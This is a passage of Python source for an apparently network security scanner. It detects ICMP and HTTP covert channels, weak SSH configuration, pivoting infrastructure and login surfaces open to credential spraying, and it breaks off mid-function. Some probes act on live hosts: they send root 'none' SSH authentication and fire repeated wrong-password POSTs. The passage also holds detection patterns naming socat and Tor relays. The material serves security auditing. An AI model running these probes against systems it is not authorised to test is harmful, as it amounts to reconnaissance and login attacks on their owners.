                    'title': 'ICMP_DATA_EXFIL',
                    'detail': (
                        f'api={api.decode()} '
                        f'note=ICMP_DATA_EXFIL_ICMP_echo_with_oversized_payload_covert_channel '
                        f'indicator=ICMP_echo_API_with_payload_size_larger_than_standard_ping_32_bytes '
                        f'source=covert_channel_detection'
                    ),
                    'host': 'localhost',
                    'port': 0,
                })
                break

    # Raw socket SOCK_RAW + IPPROTO_ICMP for crafting custom ICMP
    # SOCK_RAW = 3, IPPROTO_ICMP = 1; look for socket() call patterns
    raw_socket_markers = [
        b'SOCK_RAW',
        b'IPPROTO_ICMP',
    ]
    has_sock_raw = b'SOCK_RAW' in binary_data
    has_ipproto_icmp = b'IPPROTO_ICMP' in binary_data
    # Also check for raw numeric socket constants in proximity
    # socket(AF_INET=2, SOCK_RAW=3, IPPROTO_ICMP=1)
    raw_numeric_re = re.compile(
        rb'\x02[\x00]{1,4}\x03[\x00]{0,4}\x01'  # AF_INET, SOCK_RAW, IPPROTO_ICMP sequence
    )
    if (has_sock_raw and has_ipproto_icmp) or raw_numeric_re.search(binary_data):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ICMP_RAW_SOCKET',
            'detail': (
                'api=socket '
                'note=ICMP_RAW_SOCKET_raw_ICMP_socket_custom_packet_construction_for_covert_channel '
                'indicator=SOCK_RAW_IPPROTO_ICMP_socket_creation_enables_arbitrary_ICMP_packet_crafting '
                'source=covert_channel_detection'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # ICMP type 3 (destination unreachable) with embedded data pattern
    # Type 3 in raw ICMP: byte pattern \x03\x?? (type=3, code=0-15) followed by non-zero payload
    icmp_unreachable_re = re.compile(
        rb'\x03[\x00-\x0f]'  # ICMP type 3, code 0-15
        rb'[\x00-\xff]{2}'   # checksum
        rb'[\x00-\xff]{4}'   # unused / next-hop MTU
        rb'[\x01-\xff]'      # embedded data starts (non-zero = actual payload present)
    )
    if icmp_unreachable_re.search(binary_data):
        findings.append({
            'severity': 'HIGH',
            'title': 'ICMP_UNREACHABLE_COVERT',
            'detail': (
                'type=3 '
                'note=ICMP_UNREACHABLE_COVERT_ICMP_unreachable_with_embedded_data_payload '
                'indicator=ICMP_type3_packet_carrying_non_standard_embedded_data_beyond_original_IP_header '
                'source=covert_channel_detection'
            ),
            'host': 'localhost',
            'port': 0,
        })

    return findings


def detect_http_tunnel_patterns(binary_data: bytes) -> list:
    """Detect HTTP-based tunneling and covert channel patterns in binary data."""
    import re
    findings = []

    # HTTP CONNECT method tunneling to non-proxy ports
    # Standard proxy ports: 8080, 3128; flag anything else
    connect_re = re.compile(
        rb'CONNECT\s+[\w.\-]+:(\d{1,5})\s+HTTP'
    )
    standard_proxy_ports = {b'8080', b'3128'}
    for m in connect_re.finditer(binary_data):
        port_bytes = m.group(1)
        if port_bytes not in standard_proxy_ports:
            try:
                port_val = int(port_bytes)
            except ValueError:
                port_val = 0
            findings.append({
                'severity': 'CRITICAL',
                'title': 'HTTP_CONNECT_TUNNEL',
                'detail': (
                    f'method=CONNECT target_port={port_val} '
                    f'note=HTTP_CONNECT_TUNNEL_HTTP_CONNECT_tunneling_to_non_standard_port '
                    f'indicator=HTTP_CONNECT_to_port_{port_val}_bypasses_layer7_inspection '
                    f'source=http_tunnel_detection'
                ),
                'host': 'localhost',
                'port': port_val,
            })
            break  # one finding per binary sufficient

    # WebSocket upgrade followed by binary frame
    ws_upgrade_re = re.compile(rb'Upgrade:\s*websocket', re.IGNORECASE)
    ws_binary_frame_re = re.compile(
        rb'wss?://[\w.\-]+'  # ws:// or wss:// URI
    )
    # Binary WebSocket frame marker: FIN=1, opcode=2 (binary frame) = 0x82
    ws_binary_opcode = b'\x82'
    has_ws_upgrade = ws_upgrade_re.search(binary_data) is not None
    has_ws_uri = ws_binary_frame_re.search(binary_data) is not None
    has_binary_frame = ws_binary_opcode in binary_data
    if (has_ws_upgrade or has_ws_uri) and has_binary_frame:
        findings.append({
            'severity': 'HIGH',
            'title': 'WEBSOCKET_BINARY_TUNNEL',
            'detail': (
                'upgrade=websocket frame_opcode=0x82 '
                'note=WEBSOCKET_BINARY_TUNNEL_WebSocket_binary_framing_protocol_tunneling '
                'indicator=WebSocket_upgrade_combined_with_binary_frame_opcode_suggests_protocol_tunneling '
                'source=http_tunnel_detection'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # Long-polling pattern: repeated HTTP GET + timeout > 30s
    # Look for long timeout values (>30000 ms or >30 seconds as integer) near GET strings
    long_poll_re = re.compile(
        rb'GET\s+/[\w/.\-?=&]+'  # GET request
    )
    # Timeout heuristics: literal 30000+ ms or 30+ s as 4-byte little-endian int
    timeout_re = re.compile(
        rb'(?:'
        rb'\x30[\x75-\xff][\x00]{2}'  # >= 30000 as LE DWORD (30000 = 0x00007530)
        rb'|timeout[=:\s]+[3-9]\d{1,4}'  # "timeout=30" .. "timeout=99999"
        rb'|30000|60000|120000'  # common long-poll ms values as ASCII
        rb')'
    )
    if long_poll_re.search(binary_data) and timeout_re.search(binary_data):
        findings.append({
            'severity': 'HIGH',
            'title': 'HTTP_LONG_POLL_C2',
            'detail': (
                'method=GET pattern=long_poll '
                'note=HTTP_LONG_POLL_C2_HTTP_long_polling_beaconing_pattern '
                'indicator=sequential_HTTP_GET_requests_with_timeout_exceeding_30s_characteristic_of_C2_beaconing '
                'source=http_tunnel_detection'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # DNS-over-HTTPS (DoH) endpoint usage
    doh_patterns = [
        b'dns.google',
        b'cloudflare-dns.com',
        b'1.1.1.1',       # Cloudflare DoH IP often hardcoded
        b'8.8.8.8',       # Google DNS DoH IP
        b'/dns-query',    # standard DoH path
        b'application/dns-message',  # DoH content-type
    ]
    # Require at least two DoH signals to reduce FP
    doh_hits = [p for p in doh_patterns if p in binary_data]
    if len(doh_hits) >= 2:
        findings.append({
            'severity': 'HIGH',
            'title': 'DOH_DNS_BYPASS',
            'detail': (
                f'matched_indicators={[h.decode(errors="replace") for h in doh_hits]} '
                f'note=DOH_DNS_BYPASS_DNS_over_HTTPS_used_to_bypass_DNS_monitoring '
                f'indicator=DoH_endpoint_strings_present_DNS_resolution_tunneled_over_HTTPS_evades_DNS_inspection '
                f'source=http_tunnel_detection'
            ),
            'host': 'localhost',
            'port': 443,
        })

    return findings


def detect_ssh_weak_auth_surface(host, port=22, timeout=10.0) -> list:
    """SSH server weak authentication configuration surface.

    Synthesized from Security with Go Ch.13 (SSH client, brute-force patterns,
    RFC 4253 transport layer) and the NuClide lateral-movement doctrine.
    Probes kex_init negotiation to surface legacy algorithms without completing
    the DH exchange — stdlib only (struct + socket).
    """
    findings = []

    def _ssh_namelist(names):
        s = ','.join(names).encode('ascii')
        return struct.pack('>I', len(s)) + s

    def _build_kexinit():
        cookie = os.urandom(16)
        payload = (
            bytes([20]) +  # SSH_MSG_KEXINIT
            cookie +
            _ssh_namelist([
                'diffie-hellman-group14-sha256',
                'diffie-hellman-group14-sha1',
                'diffie-hellman-group1-sha1',
            ]) +
            _ssh_namelist(['ssh-rsa', 'ssh-dss', 'ecdsa-sha2-nistp256']) +
            _ssh_namelist(['aes128-ctr', 'aes256-ctr']) +  # enc c->s
            _ssh_namelist(['aes128-ctr', 'aes256-ctr']) +  # enc s->c
            _ssh_namelist(['hmac-sha1', 'hmac-md5']) +     # mac c->s
            _ssh_namelist(['hmac-sha1', 'hmac-md5']) +     # mac s->c
            _ssh_namelist(['none']) +                       # comp c->s
            _ssh_namelist(['none']) +                       # comp s->c
            _ssh_namelist([]) +                            # langs c->s
            _ssh_namelist([]) +                            # langs s->c
            b'\x00' +                                      # first_kex_packet_follows=false
            struct.pack('>I', 0)                           # reserved
        )
        block_size = 8
        pad_len = block_size - ((4 + 1 + len(payload)) % block_size)
        if pad_len < 4:
            pad_len += block_size
        pkt_len = 1 + len(payload) + pad_len
        return struct.pack('>IB', pkt_len, pad_len) + payload + os.urandom(pad_len)

    def _read_ssh_packet(sock):
        header = b''
        while len(header) < 4:
            chunk = sock.recv(4 - len(header))
            if not chunk:
                return None
            header += chunk
        pkt_len = struct.unpack('>I', header)[0]
        if pkt_len > 65536:
            return None
        body = b''
        while len(body) < pkt_len:
            chunk = sock.recv(pkt_len - len(body))
            if not chunk:
                return None
            body += chunk
        pad_len = body[0]
        payload = body[1:pkt_len - pad_len]
        return payload

    def _parse_namelist(data, offset):
        if offset + 4 > len(data):
            return [], offset
        length = struct.unpack('>I', data[offset:offset + 4])[0]
        end = offset + 4 + length
        if end > len(data):
            return [], end
        raw = data[offset + 4:end]
        names = [n.strip() for n in raw.decode('ascii', errors='replace').split(',') if n.strip()]
        return names, end

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Phase 1: banner exchange
        raw_banner = b''
        while b'\n' not in raw_banner and len(raw_banner) < 512:
            chunk = sock.recv(256)
            if not chunk:
                break
            raw_banner += chunk
        banner = raw_banner.split(b'\n')[0].decode('utf-8', errors='replace').strip()

        # Client sends its own version string (RFC 4253 requirement)
        sock.sendall(b'SSH-2.0-NuClide_1.0\r\n')

        # Legacy version check
        if banner.startswith('SSH-'):
            parts = banner.split('-')
            if len(parts) >= 2 and parts[1].startswith('1.'):
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'SSH_LEGACY_VERSION',
                    'detail': (
                        f'host={host} port={port} banner={banner!r} '
                        f'version={parts[1]} '
                        f'note=SSH_protocol_v1_deprecated_multiple_known_critical_vulnerabilities '
                        f'ref=RFC4253'
                    ),
                    'host': host,
                    'port': port,
                })

            # Known-vulnerable implementation fingerprints
            server_part = '-'.join(parts[2:]) if len(parts) > 2 else ''
            vuln_map = {
                'OpenSSH_2.': 'CRITICAL',
                'OpenSSH_3.': 'CRITICAL',
                'OpenSSH_4.': 'HIGH',
                'dropbear_0.': 'HIGH',
                'WeOnlyDo': 'HIGH',
            }
            for impl, sev in vuln_map.items():
                if impl.lower() in server_part.lower():
                    findings.append({
                        'severity': sev,
                        'title': 'SSH_VULNERABLE_IMPLEMENTATION',
                        'detail': (
                            f'host={host} port={port} banner={banner!r} '
                            f'matched={impl!r} '
                            f'note=Known_vulnerable_SSH_implementation_EOL_version'
                        ),
                        'host': host,
                        'port': port,
                    })
                    break

        # Phase 2: kex_init exchange — send ours, parse server's
        sock.sendall(_build_kexinit())
        server_payload = _read_ssh_packet(sock)

        if server_payload and len(server_payload) >= 17 and server_payload[0] == 20:
            # SSH_MSG_KEXINIT: skip type byte (1) + cookie (16)
            offset = 17
            kex_algos, offset = _parse_namelist(server_payload, offset)
            host_key_algos, offset = _parse_namelist(server_payload, offset)

            if 'diffie-hellman-group1-sha1' in kex_algos:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'SSH_WEAK_KEX_DH_GROUP1',
                    'detail': (
                        f'host={host} port={port} '
                        f'kex_algos={kex_algos!r} '
                        f'note=DH_group1_SHA1_kex_768-1024bit_LOGJAM_CVE-2015-4000 '
                        f'ref=RFC4253'
                    ),
                    'host': host,
                    'port': port,
                })

            if 'diffie-hellman-group14-sha1' in kex_algos:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SSH_WEAK_KEX_SHA1',
                    'detail': (
                        f'host={host} port={port} '
                        f'kex_algos={kex_algos!r} '
                        f'note=DH_group14_SHA1_kex_deprecated_SHA1_collision_risk '
                        f'ref=RFC4253'
                    ),
                    'host': host,
                    'port': port,
                })

            if 'ssh-dss' in host_key_algos:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SSH_DSA_HOST_KEY',
                    'detail': (
                        f'host={host} port={port} '
                        f'host_key_algos={host_key_algos!r} '
                        f'note=DSA_host_key_1024bit_broken_NIST_deprecated_2014 '
                        f'ref=NIST_SP800-131A'
                    ),
                    'host': host,
                    'port': port,
                })

        sock.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    return findings


def detect_exposed_jump_host_indicators(host, port=22, timeout=10.0) -> list:
    """SSH jump-host / bastion host lateral-movement surface indicators.

    Synthesized from Security with Go Ch.13 (SSH authentication flows, RFC 4252
    userauth protocol) and lateral-movement doctrine. Detects jump-host
    self-labeling in banner and probes auth method advertisement via pre-kex
    USERAUTH_REQUEST — surfaces allowed methods on implementations that respond
    before DH completes.
    """
    findings = []

    JUMP_HOST_KEYWORDS = [
        'jumphost', 'jump-host', 'jump_host',
        'bastion', 'gateway', 'relay', 'proxy',
        'bouncer', 'pivot',
    ]

    def _ssh_namelist(names):
        s = ','.join(names).encode('ascii')
        return struct.pack('>I', len(s)) + s

    def _ssh_string(s):
        b = s.encode('utf-8')
        return struct.pack('>I', len(b)) + b

    def _build_packet(payload):
        block_size = 8
        pad_len = block_size - ((4 + 1 + len(payload)) % block_size)
        if pad_len < 4:
            pad_len += block_size
        pkt_len = 1 + len(payload) + pad_len
        return struct.pack('>IB', pkt_len, pad_len) + payload + os.urandom(pad_len)

    def _build_kexinit():
        payload = (
            bytes([20]) +
            os.urandom(16) +                                   # cookie
            _ssh_namelist(['diffie-hellman-group14-sha256']) +  # kex
            _ssh_namelist(['ssh-rsa', 'ecdsa-sha2-nistp256']) + # host-key
            _ssh_namelist(['aes128-ctr']) +                    # enc c->s
            _ssh_namelist(['aes128-ctr']) +                    # enc s->c
            _ssh_namelist(['hmac-sha2-256']) +                 # mac c->s
            _ssh_namelist(['hmac-sha2-256']) +                 # mac s->c
            _ssh_namelist(['none']) +                          # comp c->s
            _ssh_namelist(['none']) +                          # comp s->c
            _ssh_namelist([]) +                               # langs c->s
            _ssh_namelist([]) +                               # langs s->c
            b'\x00' +                                         # first_kex_packet_follows=false
            struct.pack('>I', 0)                              # reserved
        )
        return _build_packet(payload)

    def _build_userauth_none(username='root'):
        # SSH_MSG_USERAUTH_REQUEST = 50 (RFC 4252)
        payload = (
            bytes([50]) +
            _ssh_string(username) +
            _ssh_string('ssh-connection') +
            _ssh_string('none')
        )
        return _build_packet(payload)

    def _read_ssh_packet(sock):
        header = b''
        while len(header) < 4:
            chunk = sock.recv(4 - len(header))
            if not chunk:
                return None
            header += chunk
        pkt_len = struct.unpack('>I', header)[0]
        if pkt_len > 65536:
            return None
        body = b''
        while len(body) < pkt_len:
            chunk = sock.recv(pkt_len - len(body))
            if not chunk:
                return None
            body += chunk
        pad_len = body[0]
        return body[1:pkt_len - pad_len]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Phase 1: banner exchange
        raw_banner = b''
        while b'\n' not in raw_banner and len(raw_banner) < 512:
            chunk = sock.recv(256)
            if not chunk:
                break
            raw_banner += chunk
        banner_line = raw_banner.split(b'\n')[0].decode('utf-8', errors='replace').strip()
        banner_lower = banner_line.lower()

        sock.sendall(b'SSH-2.0-NuClide_1.0\r\n')

        # Jump-host keyword detection in banner
        matched_kw = [kw for kw in JUMP_HOST_KEYWORDS if kw in banner_lower]
        if matched_kw:
            findings.append({
                'severity': 'HIGH',
                'title': 'SSH_JUMP_HOST_LABELED',
                'detail': (
                    f'host={host} port={port} banner={banner_line!r} '
                    f'matched_keywords={matched_kw!r} '
                    f'note=SSH_banner_self-identifies_as_jump_host_or_bastion '
                    f'indicator=lateral_movement_pivot_surface'
                ),
                'host': host,
                'port': port,
            })

        # Phase 2: kexinit exchange, then probe auth methods
        sock.sendall(_build_kexinit())
        server_kexinit = _read_ssh_packet(sock)

        if server_kexinit is None:
            sock.close()
            return findings

        # Send USERAUTH_REQUEST (none method) for root before kex completes.
        # RFC 4252: server MUST respond with USERAUTH_FAILURE listing allowed methods.
        # Pre-encryption sends surface method lists on some implementations.
        sock.sendall(_build_userauth_none(username='root'))

        try:
            sock.settimeout(timeout)
            response = _read_ssh_packet(sock)
        except (socket.timeout, OSError):
            response = None

        if response and len(response) >= 1:
            msg_type = response[0]

            # SSH_MSG_USERAUTH_SUCCESS = 52
            if msg_type == 52:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'SSH_NULL_AUTH_ACCEPTED',
                    'detail': (
                        f'host={host} port={port} banner={banner_line!r} '
                        f'method=none username=root '
                        f'note=SSH_server_accepted_null_auth_no_credentials_required '
                        f'impact=immediate_shell_access_as_root'
                    ),
                    'host': host,
                    'port': port,
                })

            # SSH_MSG_USERAUTH_FAILURE = 51
            elif msg_type == 51 and len(response) >= 5:
                methods_len = struct.unpack('>I', response[1:5])[0]
                if 5 + methods_len <= len(response):
                    methods_raw = response[5:5 + methods_len].decode('ascii', errors='replace')
                    methods = [m.strip() for m in methods_raw.split(',') if m.strip()]

                    if methods:
                        findings.append({
                            'severity': 'MEDIUM',
                            'title': 'SSH_ROOT_LOGIN_ENABLED',
                            'detail': (
                                f'host={host} port={port} banner={banner_line!r} '
                                f'auth_methods={methods!r} '
                                f'note=SSH_root_account_accepts_auth_requests '
                                f'indicator=PermitRootLogin_not_disabled'
                            ),
                            'host': host,
                            'port': port,
                        })

                    if 'password' in methods:
                        findings.append({
                            'severity': 'HIGH',
                            'title': 'SSH_PASSWORD_AUTH_ON_JUMP_HOST',
                            'detail': (
                                f'host={host} port={port} banner={banner_line!r} '
                                f'auth_methods={methods!r} '
                                f'note=Password_auth_enabled_on_jump_host_brute_force_pivot_surface '
                                f'indicator=password_in_userauth_failure_methods_list'
                            ),
                            'host': host,
                            'port': port,
                        })

        sock.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    return findings


def detect_network_pivoting_indicators(host, port=0, timeout=5.0) -> list:
    """Detect network pivoting and tunneling infrastructure.

    Synthesized from Black Hat Python 2nd Ed. Ch.2 (pure-socket TCP connect,
    banner grabbing from raw socket clients) and Ch.3 (raw-socket host
    discovery with ICMP/UDP probes) — stdlib-only pivot surface detection
    without external dependencies.

    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    findings = []

    # --- SSH banner probe on port 22 ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, 22))
        banner = b''
        try:
            banner = sock.recv(256)
        except (socket.timeout, OSError):
            pass
        sock.close()

        if banner:
            banner_str = banner.decode('ascii', errors='replace')
            if banner_str.startswith('SSH-'):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SSH_PIVOT_CANDIDATE',
                    'detail': (
                        f'host={host} port=22 banner={banner_str[:60]!r} '
                        f'note=SSH_service_reachable_potential_pivot_relay '
                        f'indicator=TCP_22_open_with_SSH_banner '
                        f'action=probe_127.0.0.1_reachability_through_this_host'
                    ),
                    'host': host,
                    'port': 22,
                })
            else:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'NON_SSH_ON_22',
                    'detail': (
                        f'host={host} port=22 banner_hex={banner[:16].hex()} '
                        f'note=TCP_22_response_is_not_SSH_banner '
                        f'indicator=tunneling_tool_or_redirector_masking_on_22 '
                        f'action=inspect_banner_identify_actual_protocol'
                    ),
                    'host': host,
                    'port': 22,
                })
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    # --- Non-TLS traffic check on port 443 ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, 443))
        # Minimal TLS ClientHello probe: content type 0x16 = handshake
        sock.sendall(b'\x16\x03\x01\x00\x00')
        data = b''
        try:
            data = sock.recv(16)
        except (socket.timeout, OSError):
            pass
        sock.close()
        if data and data[0] != 0x16:
            findings.append({
                'severity': 'HIGH',
                'title': 'NON_TLS_ON_443',
                'detail': (
                    f'host={host} port=443 response_hex={data[:8].hex()} '
                    f'note=TCP_443_response_is_not_TLS_ServerHello '
                    f'indicator=plain_text_tunnel_or_covert_channel_on_443 '
                    f'action=inspect_protocol_identify_tunnel_type'
                ),
                'host': host,
                'port': 443,
            })
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    # --- Non-HTTP traffic check on port 80 ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, 80))
        sock.sendall(b'GET / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
        data = b''
        try:
            data = sock.recv(64)
        except (socket.timeout, OSError):
            pass
        sock.close()
        if data:
            text = data.decode('ascii', errors='replace')
            if not (text.startswith('HTTP/') or text.startswith('HTTP ')):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'NON_HTTP_ON_80',
                    'detail': (
                        f'host={host} port=80 response_hex={data[:16].hex()} '
                        f'note=TCP_80_response_is_not_HTTP '
                        f'indicator=binary_tunnel_or_covert_protocol_on_port_80 '
                        f'action=identify_actual_protocol_check_for_socat_netcat_relay'
                    ),
                    'host': host,
                    'port': 80,
                })
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    # --- VPN service ports: 1194 OpenVPN, 1701 L2TP, 1723 PPTP ---
    vpn_ports = [
        (1194, 'OpenVPN'),
        (1701, 'L2TP'),
        (1723, 'PPTP'),
    ]
    probe_timeout = max(timeout / 2, 2.0)
    for vport, vname in vpn_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(probe_timeout)
            result = sock.connect_ex((host, vport))
            sock.close()
            if result == 0:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'VPN_SERVICE_EXPOSED',
                    'detail': (
                        f'host={host} port={vport} service={vname} '
                        f'note=VPN_daemon_port_open_and_accepting_connections '
                        f'indicator=potential_egress_tunnel_or_pivot_channel '
                        f'action=determine_if_unauthorized_VPN_relay'
                    ),
                    'host': host,
                    'port': vport,
                })
        except (socket.timeout, OSError):
            pass

    # --- Anonymization / proxy chaining: Tor SOCKS5 9050, 8888, 3128 ---
    proxy_ports = [
        (9050, 'Tor SOCKS5'),
        (8888, 'HTTP proxy / tunnel'),
        (3128, 'Squid / HTTP proxy'),
    ]
    for pport, pname in proxy_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(probe_timeout)
            result = sock.connect_ex((host, pport))
            if result != 0:
                sock.close()
                continue
            detail_suffix = ''
            if pport == 9050:
                try:
                    sock.sendall(b'\x05\x01\x00')  # SOCKS5 no-auth greeting
                    socks_resp = sock.recv(16)
                    if socks_resp and socks_resp[0:1] == b'\x05':
                        detail_suffix = ' tor_handshake=CONFIRMED'
                except (socket.timeout, OSError):
                    pass
            sock.close()
            findings.append({
                'severity': 'HIGH',
                'title': 'ANONYMIZATION_PROXY_EXPOSED',
                'detail': (
                    f'host={host} port={pport} service={pname} '
                    f'note=anonymization_or_proxy_port_open '
                    f'indicator=traffic_routing_obfuscation_surface'
                    + detail_suffix +
                    f' action=determine_if_unauthorized_outbound_relay'
                ),
                'host': host,
                'port': pport,
            })
        except (socket.timeout, OSError):
            pass

    # --- Local /proc checks: socat relay processes and elevated listen count ---
    if os.path.isdir('/proc'):
        tcp6_path = '/proc/net/tcp6'
        if os.path.isfile(tcp6_path):
            try:
                with open(tcp6_path, 'r', errors='replace') as fh:
                    lines = fh.readlines()[1:]
                # state column at field[3]; 0A = LISTEN
                listen_entries = [l for l in lines if len(l.split()) > 3 and l.split()[3] == '0A']
                if len(listen_entries) > 8:
                    findings.append({
                        'severity': 'MEDIUM',
                        'title': 'NETWORK_PORT_FORWARDING_ACTIVE',
                        'detail': (
                            f'host={host} port=0 '
                            f'tcp6_listen_count={len(listen_entries)} '
                            f'note=elevated_listening_socket_count_in_proc_net_tcp6 '
                            f'indicator=possible_portproxy_or_netsh_forwarding_rules '
                            f'action=enumerate_listening_ports_compare_to_intended_services'
                        ),
                        'host': host,
                        'port': 0,
                    })
            except (OSError, PermissionError):
                pass

        try:
            for pid in os.listdir('/proc'):
                if not pid.isdigit():
                    continue
                cmdline_path = f'/proc/{pid}/cmdline'
                try:
                    with open(cmdline_path, 'rb') as fh:
                        raw = fh.read(512)
                    cmdline = raw.replace(b'\x00', b' ').decode('ascii', errors='replace').lower()
                    if 'socat' in cmdline and (
                        'tcp-listen' in cmdline
                        or 'tcp-connect' in cmdline
                        or 'tcp:' in cmdline
                    ):
                        findings.append({
                            'severity': 'HIGH',
                            'title': 'SOCAT_NETWORK_RELAY',
                            'detail': (
                                f'host={host} port=0 pid={pid} '
                                f'cmdline={cmdline[:120]!r} '
                                f'note=socat_process_detected_with_network_relay_arguments '
                                f'indicator=active_TCP_relay_or_port_forward_via_socat '
                                f'action=inspect_socat_args_identify_relay_topology'
                            ),
                            'host': host,
                            'port': 0,
                        })
                        break
                except (OSError, PermissionError):
                    continue
        except (OSError, PermissionError):
            pass

    return findings


def detect_credential_spraying_surface(host, port=80, timeout=10.0) -> list:
    """Detect authentication surfaces vulnerable to credential spraying.

    Synthesized from Black Hat Python 2nd Ed. Ch.2 (pure-socket HTTP clients,
    GET/POST request construction) and Ch.8 (web attack tooling patterns) —
    identifies login endpoints with no lockout, no MFA signals, or exposed
    enterprise auth portals using stdlib urllib.request and regex only.

    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    import ssl as _ssl
    import time as _time

    findings = []
    scheme = 'https' if port in (443, 8443) else 'http'
    base_url = f'{scheme}://{host}:{port}'

    # Permissive SSL context for internal/self-signed certs
    _ctx = _ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = _ssl.CERT_NONE

    def _req(path, method='GET', data=None, extra_headers=None, req_timeout=None):
        """Single HTTP request; returns (status, headers_dict, body_bytes) or None."""
        url = base_url + path
        hdrs = {
            'User-Agent': 'Mozilla/5.0 (compatible; security-audit/1.0)',
            'Accept': 'text/html,application/json',
            'Connection': 'close',
        }
        if extra_headers:
            hdrs.update(extra_headers)
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            with urllib.request.urlopen(
                req, timeout=req_timeout or timeout, context=_ctx
            ) as resp:
                body = resp.read(16384)
                return resp.status, dict(resp.headers), body
        except urllib.error.HTTPError as exc:
            try:
                body = exc.read(4096)
            except Exception:
                body = b''
            return exc.code, dict(exc.headers), body
        except Exception:
            return None

    # --- Web login form discovery ---
    login_paths = ['/', '/login', '/admin', '/signin', '/auth', '/wp-login.php', '/user/login']
    form_tested = False
    for path in login_paths:
        result = _req(path)
        if result is None:
            continue
        status, resp_headers, body = result
        if status not in (200, 301, 302):
            continue
        body_str = body.decode('utf-8', errors='replace').lower()
        has_form = '<form' in body_str
        has_password = bool(re.search(r'type=["\']?password["\']?', body_str))
        if not (has_form and has_password):
            continue

        findings.append({
            'severity': 'MEDIUM',
            'title': 'WEB_LOGIN_FORM_FOUND',
            'detail': (
                f'host={host} port={port} path={path} '
                f'note=HTML_form_with_password_field_detected '
                f'indicator=credential_spraying_surface_exists '
                f'action=test_for_lockout_captcha_MFA_controls'
            ),
            'host': host,
            'port': port,
        })

        # CAPTCHA check
        has_captcha = bool(re.search(r'recaptcha|hcaptcha|captcha', body_str))
        if not has_captcha:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'NO_CAPTCHA_ON_LOGIN',
                'detail': (
                    f'host={host} port={port} path={path} '
                    f'note=login_form_lacks_CAPTCHA_widget '
                    f'indicator=no_bot_challenge_on_auth_endpoint '
                    f'action=confirm_absence_then_test_automated_spraying'
                ),
                'host': host,
                'port': port,
            })

        # Account lockout: 5 rapid wrong-cred POSTs; no 429/lockout = finding
        wrong_creds = b'username=audit_probe_user&password=Wr0ngP%40ss!'
        lockout_detected = False
        spray_timeout = max(timeout / 3, 3.0)
        for _ in range(5):
            spray = _req(
                path,
                method='POST',
                data=wrong_creds,
                extra_headers={'Content-Type': 'application/x-www-form-urlencoded'},
                req_timeout=spray_timeout,
            )
            if spray is not None:
                spray_status, _, spray_body = spray
                spray_text = spray_body.decode('utf-8', errors='replace').lower()
                if spray_status in (429, 423) or bool(
                    re.search(r'locked|too.many.attempt|account.disabled', spray_text)
                ):
                    lockout_detected = True
                    break

        if not lockout_detected:
            findings.append({
                'severity': 'HIGH',
                'title': 'NO_ACCOUNT_LOCKOUT',
                'detail': (
                    f'host={host} port={port} path={path} '
                    f'spray_attempts=5 lockout_triggered=false '
                    f'note=5_rapid_failed_auth_attempts_no_429_or_lockout_response '
                    f'indicator=credential_spraying_viable_no_brute_force_protection '
                    f'action=confirm_with_extended_spray_verify_no_silent_backend_lockout'
                ),
                'host': host,
                'port': port,
            })

        form_tested = True
        break  # one login form path sufficient

    # --- Rate-limit header presence on base path ---
    base_result = _req('/')
    if base_result is not None:
        _, resp_headers, _ = base_result
        lower_keys = {k.lower() for k in resp_headers}
        rl_headers = [
            'x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after', 'ratelimit-limit',
        ]
        found_rl = [h for h in rl_headers if h in lower_keys]
        if found_rl:
            findings.append({
                'severity': 'INFO',
                'title': 'RATE_LIMIT_HEADERS_PRESENT',
                'detail': (
                    f'host={host} port={port} path=/ '
                    f'headers={found_rl!r} '
                    f'note=rate_limiting_headers_present_in_HTTP_response '
                    f'indicator=server_signals_rate_limit_enforcement '
                    f'action=verify_headers_are_enforced_not_decorative'
                ),
                'host': host,
                'port': port,
            })

    # --- API login endpoints: timing + 429 check ---
    api_paths = ['/api/login', '/api/v1/auth', '/api/authenticate', '/api/v1/login']
    json_creds = b'{"username":"audit_probe","password":"Wr0ngPass123!"}'
    api_timeout = max(timeout / 3, 3.0)
    for api_path in api_paths:
        timings = []
        last_status = None
        rate_limited = False
        for _ in range(5):
            t0 = _time.monotonic()
            ar = _req(
                api_path,
                method='POST',
                data=json_creds,
                extra_headers={'Content-Type': 'application/json'},
                req_timeout=api_timeout,
            )
            elapsed_ms = (_time.monotonic() - t0) * 1000
            if ar is not None:
                last_status = ar[0]
                if last_status == 429:
                    rate_limited = True
                    break
                timings.append(elapsed_ms)

        if not rate_limited and len(timings) >= 3 and last_status not in (404, None):
